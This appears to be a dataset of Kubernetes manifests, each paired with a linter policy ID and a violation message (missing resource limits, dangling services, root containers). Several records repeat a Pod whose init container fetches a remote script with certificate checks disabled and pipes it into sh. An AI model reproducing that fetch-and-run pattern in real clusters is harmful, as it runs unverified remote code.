    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: alsam/alex:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-web\n    image: busybox:1.31.0\n    volumeMounts:\n    - name: app\n      mountPath: /app\n    command:\n    - sh\n    - -c\n    - wget -O- --no-check-certificate https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-web\" has cpu request 0"
  },
  {
    "id": "3215",
    "manifest_path": "data/manifests/the_stack_sample/sample_0975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: alsam/alex:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-web\n    image: busybox:1.31.0\n    volumeMounts:\n    - name: app\n      mountPath: /app\n    command:\n    - sh\n    - -c\n    - wget -O- --no-check-certificate https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "3216",
    "manifest_path": "data/manifests/the_stack_sample/sample_0975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: alsam/alex:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-web\n    image: busybox:1.31.0\n    volumeMounts:\n    - name: app\n      mountPath: /app\n    command:\n    - sh\n    - -c\n    - wget -O- --no-check-certificate https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-web\" has memory limit 0"
  },
  {
    "id": "3217",
    "manifest_path": "data/manifests/the_stack_sample/sample_0975.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: web\n    image: alsam/alex:latest\n    volumeMounts:\n    - name: app\n      mountPath: /app\n  initContainers:\n  - name: init-web\n    image: busybox:1.31.0\n    volumeMounts:\n    - name: app\n      mountPath: /app\n    command:\n    - sh\n    - -c\n    - wget -O- --no-check-certificate https://raw.githubusercontent.com/express42/otus-platform-snippets/master/Module-02/Introduction-to-Kubernetes/wget.sh\n      | sh\n  volumes:\n  - name: app\n    emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "3218",
    "manifest_path": "data/manifests/the_stack_sample/sample_0976.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: echo\n  namespace: janne-app-echo\nspec:\n  selector:\n    app: echo\n  ports:\n  - port: 32222\n    nodePort: 32222\n    targetPort: 80\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:echo])"
  },
  {
    "id": "3219",
    "manifest_path": "data/manifests/the_stack_sample/sample_0977.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/instance: my-release\n    app.kubernetes.io/name: hazelcast-enterprise\n  name: my-release-hazelcast-enterprise-mancenter\n  namespace: default\nspec:\n  ports:\n  - name: mancenterport\n    nodePort: 31000\n    port: 8080\n    protocol: TCP\n    targetPort: mancenter\n  selector:\n    app.kubernetes.io/instance: my-release\n    app.kubernetes.io/name: hazelcast-enterprise\n    role: mancenter\n  sessionAffinity: None\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/instance:my-release app.kubernetes.io/name:hazelcast-enterprise role:mancenter])"
  },
  {
    "id": "3220",
    "manifest_path": "data/manifests/the_stack_sample/sample_0978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: guestbook\n      tier: frontend\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: guestbook\n        tier: frontend\n        blinkt: show\n        blinktColor: 3307A2\n    spec:\n      containers:\n      - name: php-redis\n        image: gcr.io/google-samples/gb-frontend:v4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3221",
    "manifest_path": "data/manifests/the_stack_sample/sample_0978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: guestbook\n      tier: frontend\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: guestbook\n        tier: frontend\n        blinkt: show\n        blinktColor: 3307A2\n    spec:\n      containers:\n      - name: php-redis\n        image: gcr.io/google-samples/gb-frontend:v4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"php-redis\" does not have a read-only root file system"
  },
  {
    "id": "3222",
    "manifest_path": "data/manifests/the_stack_sample/sample_0978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: guestbook\n      tier: frontend\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: guestbook\n        tier: frontend\n        blinkt: show\n        blinktColor: 3307A2\n    spec:\n      containers:\n      - name: php-redis\n        image: gcr.io/google-samples/gb-frontend:v4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"php-redis\" is not set to runAsNonRoot"
  },
  {
    "id": "3223",
    "manifest_path": "data/manifests/the_stack_sample/sample_0978.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\nspec:\n  selector:\n    matchLabels:\n      app: guestbook\n      tier: frontend\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: guestbook\n        tier: frontend\n        blinkt: show\n        blinktColor: 3307A2\n    spec:\n      containers:\n      - name: php-redis\n        image: gcr.io/google-samples/gb-frontend:v4\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: GET_HOSTS_FROM\n          value: dns\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"php-redis\" has memory limit 0"
  },
  {
    "id": "3224",
    "manifest_path": "data/manifests/the_stack_sample/sample_0981.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: simple-vault-worker\n    environment: Development\n  name: simple-vault-worker\n  namespace: sirius\nspec:\n  ports:\n  - name: http\n    port: 8080\n    protocol: TCP\n    targetPort: 5000\n  selector:\n    app: simple-vault-worker\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:simple-vault-worker])"
  },
  {
    "id": "3225",
    "manifest_path": "data/manifests/the_stack_sample/sample_0982.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: foo\n  name: foo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: foo\n  template:\n    metadata:\n      labels:\n        app: foo\n    spec:\n      containers:\n      - image: foo@sha256:your-image-digest\n        imagePullPolicy: Always\n        name: foo\n        resources:\n          limits:\n            memory: 768Mi\n        env:\n        - name: HOST_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 11\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"foo\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "3226",
    "manifest_path": "data/manifests/the_stack_sample/sample_0982.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: foo\n  name: foo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: foo\n  template:\n    metadata:\n      labels:\n        app: foo\n    spec:\n      containers:\n      - image: foo@sha256:your-image-digest\n        imagePullPolicy: Always\n        name: foo\n        resources:\n          limits:\n            memory: 768Mi\n        env:\n        - name: HOST_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 11\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"foo\" does not have a read-only root file system"
  },
  {
    "id": "3227",
    "manifest_path": "data/manifests/the_stack_sample/sample_0982.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: foo\n  name: foo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: foo\n  template:\n    metadata:\n      labels:\n        app: foo\n    spec:\n      containers:\n      - image: foo@sha256:your-image-digest\n        imagePullPolicy: Always\n        name: foo\n        resources:\n          limits:\n            memory: 768Mi\n        env:\n        - name: HOST_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 11\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"foo\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "3228",
    "manifest_path": "data/manifests/the_stack_sample/sample_0982.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: foo\n  name: foo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: foo\n  template:\n    metadata:\n      labels:\n        app: foo\n    spec:\n      containers:\n      - image: foo@sha256:your-image-digest\n        imagePullPolicy: Always\n        name: foo\n        resources:\n          limits:\n            memory: 768Mi\n        env:\n        - name: HOST_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 11\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"foo\" is not set to runAsNonRoot"
  },
  {
    "id": "3229",
    "manifest_path": "data/manifests/the_stack_sample/sample_0982.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: foo\n  name: foo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: foo\n  template:\n    metadata:\n      labels:\n        app: foo\n    spec:\n      containers:\n      - image: foo@sha256:your-image-digest\n        imagePullPolicy: Always\n        name: foo\n        resources:\n          limits:\n            memory: 768Mi\n        env:\n        - name: HOST_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_SERVICE_ACCOUNT\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.serviceAccountName\n        livenessProbe:\n          httpGet:\n            path: /actuator/health/liveness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /actuator/health/readiness\n            port: 8080\n          initialDelaySeconds: 2\n          timeoutSeconds: 11\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"foo\" has cpu request 0"
  },
  {
    "id": "3230",
    "manifest_path": "data/manifests/the_stack_sample/sample_0983.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: weave-scope-app\n  labels:\n    name: weave-scope-app\n    app: weave-scope\n    weave-cloud-component: scope\n    weave-scope-component: app\n  namespace: weave\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: weave-scope\n  template:\n    metadata:\n      labels:\n        name: weave-scope-app\n        app: weave-scope\n        weave-cloud-component: scope\n        weave-scope-component: app\n    spec:\n      containers:\n      - name: app\n        args:\n        - --no-probe\n        env: []\n        image: weaveworks/scope:1.13.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 4040\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "3231",
    "manifest_path": "data/manifests/the_stack_sample/sample_0983.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: weave-scope-app\n  labels:\n    name: weave-scope-app\n    app: weave-scope\n    weave-cloud-component: scope\n    weave-scope-component: app\n  namespace: weave\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: weave-scope\n  template:\n    metadata:\n      labels:\n        name: weave-scope-app\n        app: weave-scope\n        weave-cloud-component: scope\n        weave-scope-component: app\n    spec:\n      containers:\n      - name: app\n        args:\n        - --no-probe\n        env: []\n        image: weaveworks/scope:1.13.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 4040\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "3232",
    "manifest_path": "data/manifests/the_stack_sample/sample_0983.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: weave-scope-app\n  labels:\n    name: weave-scope-app\n    app: weave-scope\n    weave-cloud-component: scope\n    weave-scope-component: app\n  namespace: weave\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: weave-scope\n  template:\n    metadata:\n      labels:\n        name: weave-scope-app\n        app: weave-scope\n        weave-cloud-component: scope\n        weave-scope-component: app\n    spec:\n      containers:\n      - name: app\n        args:\n        - --no-probe\n        env: []\n        image: weaveworks/scope:1.13.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 4040\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 200m\n            memory: 200Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app\" has memory limit 0"
  },
  {
    "id": "3233",
    "manifest_path": "data/manifests/the_stack_sample/sample_0987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.885\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\n    jenkins-x.io/hash: e815f2ccc606190328779dadb61e45181c1c8c828dbf6f63e28438c1fba1f776\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        draft: draft-app\n        app: lighthouse-foghorn\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: gcr.io/jenkinsxio/lighthouse-foghorn:0.0.885\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: hlechuga\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: gcr.io/jenkinsxio/builder-maven:2.1.142-761\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-foghorn\" does not have a read-only root file system"
  },
  {
    "id": "3234",
    "manifest_path": "data/manifests/the_stack_sample/sample_0987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.885\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\n    jenkins-x.io/hash: e815f2ccc606190328779dadb61e45181c1c8c828dbf6f63e28438c1fba1f776\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        draft: draft-app\n        app: lighthouse-foghorn\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: gcr.io/jenkinsxio/lighthouse-foghorn:0.0.885\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: hlechuga\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: gcr.io/jenkinsxio/builder-maven:2.1.142-761\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-foghorn\" not found"
  },
  {
    "id": "3235",
    "manifest_path": "data/manifests/the_stack_sample/sample_0987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.885\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\n    jenkins-x.io/hash: e815f2ccc606190328779dadb61e45181c1c8c828dbf6f63e28438c1fba1f776\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        draft: draft-app\n        app: lighthouse-foghorn\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: gcr.io/jenkinsxio/lighthouse-foghorn:0.0.885\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: hlechuga\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: gcr.io/jenkinsxio/builder-maven:2.1.142-761\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-foghorn\" is not set to runAsNonRoot"
  },
  {
    "id": "3236",
    "manifest_path": "data/manifests/the_stack_sample/sample_0987.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    draft: draft-app\n    chart: lighthouse-0.0.885\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\n    jenkins-x.io/hash: e815f2ccc606190328779dadb61e45181c1c8c828dbf6f63e28438c1fba1f776\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      draft: draft-app\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        draft: draft-app\n        app: lighthouse-foghorn\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: gcr.io/jenkinsxio/lighthouse-foghorn:0.0.885\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: hlechuga\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: gcr.io/jenkinsxio/builder-maven:2.1.142-761\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"lighthouse-foghorn\" has cpu request 0"
  },
  {
    "id": "3237",
    "manifest_path": "data/manifests/the_stack_sample/sample_0991.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-ingress\n  namespace: nginx-ingress\nspec:\n  type: NodePort\n  ports:\n  - name: http\n    port: 8080\n    nodePort: 30080\n    targetPort: 80\n    protocol: TCP\n  selector:\n    k8s-app: nginx-ingress-lb\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[k8s-app:nginx-ingress-lb])"
  },
  {
    "id": "3238",
    "manifest_path": "data/manifests/the_stack_sample/sample_0994.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: app\nspec:\n  selector:\n    app: app\n  ports:\n  - protocol: TCP\n    port: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:app])"
  },
  {
    "id": "3239",
    "manifest_path": "data/manifests/the_stack_sample/sample_0997.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: mysql-operator\n  template:\n    metadata:\n      labels:\n        name: mysql-operator\n    spec:\n      serviceAccountName: mysql-operator\n      containers:\n      - name: operator\n        image: atalabirchuk/otus:mysql-operator_v1\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"operator\" does not have a read-only root file system"
  },
  {
    "id": "3240",
    "manifest_path": "data/manifests/the_stack_sample/sample_0997.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: mysql-operator\n  template:\n    metadata:\n      labels:\n        name: mysql-operator\n    spec:\n      serviceAccountName: mysql-operator\n      containers:\n      - name: operator\n        image: atalabirchuk/otus:mysql-operator_v1\n        imagePullPolicy: Always\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"mysql-operator\" not found"
  },
  {
    "id": "3241",
    "manifest_path": "data/manifests/the_stack_sample/sample_0997.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: mysql-operator\n  template:\n    metadata:\n      labels:\n        name: mysql-operator\n    spec:\n      serviceAccountName: mysql-operator\n      containers:\n      - name: operator\n        image: atalabirchuk/otus:mysql-operator_v1\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"operator\" is not set to runAsNonRoot"
  },
  {
    "id": "3242",
    "manifest_path": "data/manifests/the_stack_sample/sample_0997.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: mysql-operator\n  template:\n    metadata:\n      labels:\n        name: mysql-operator\n    spec:\n      serviceAccountName: mysql-operator\n      containers:\n      - name: operator\n        image: atalabirchuk/otus:mysql-operator_v1\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"operator\" has cpu request 0"
  },
  {
    "id": "3243",
    "manifest_path": "data/manifests/the_stack_sample/sample_0997.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mysql-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: mysql-operator\n  template:\n    metadata:\n      labels:\n        name: mysql-operator\n    spec:\n      serviceAccountName: mysql-operator\n      containers:\n      - name: operator\n        image: atalabirchuk/otus:mysql-operator_v1\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"operator\" has memory limit 0"
  },
  {
    "id": "3244",
